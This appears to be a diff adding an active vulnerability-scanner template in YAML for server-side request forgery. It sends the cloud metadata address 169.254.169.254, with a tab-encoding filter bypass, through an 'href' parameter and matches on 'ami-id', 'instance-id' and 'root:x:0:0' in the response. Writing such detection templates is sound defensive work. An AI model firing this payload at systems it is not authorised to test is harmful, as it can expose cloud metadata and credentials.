@@ -1,0 +1,25 @@
+id: ssrf2-086
+name: 'SSRF2 bypass via href'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - cloud
+  - bypass
+description: 'SSRF filter bypass via href'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      href:
+        - 'http://169.254.169.254%09/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
+          - 'root:x:0:0'
+          - 'PONG'
